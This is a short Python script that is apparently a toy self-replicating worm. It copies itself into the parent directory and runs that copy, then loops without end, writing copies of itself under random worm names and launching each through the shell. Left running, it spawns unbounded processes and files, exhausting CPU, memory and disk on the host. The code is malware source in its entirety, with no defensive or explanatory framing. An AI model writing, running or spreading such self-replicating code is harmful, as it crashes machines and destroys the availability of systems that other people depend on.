from subprocess import run
import shutil
from random import seed, randint

# Initialise random library
seed()

# Adopt worm1.py name
shutil.copy(__file__, "../")
run(("worm1.py"), shell=True, cwd="../")

while True:
    # Create a version of itself
    file_name = "worm"+str(randint(2, 5000))+".py"
    shutil.copy(__file__, file_name)
    run((file_name), shell=True)
